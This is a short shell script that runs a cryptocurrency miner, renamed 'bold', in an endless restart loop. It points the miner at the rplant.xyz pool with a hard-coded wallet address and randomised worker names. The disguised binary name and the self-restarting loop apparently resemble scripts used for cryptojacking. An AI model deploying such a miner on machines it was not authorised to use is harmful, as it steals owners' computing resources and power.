#!/bin/sh
#
while [ 1 ]; do
./bold -a yespower -o stratum+tcps://stratum-eu.rplant.xyz:3350 -u VT9BGJKc6zhAtc9oEaPWQekZQDiUtkFXXB.$(echo $(shuf -i 1-50 -n 1)-bool) -t4
sleep 5
done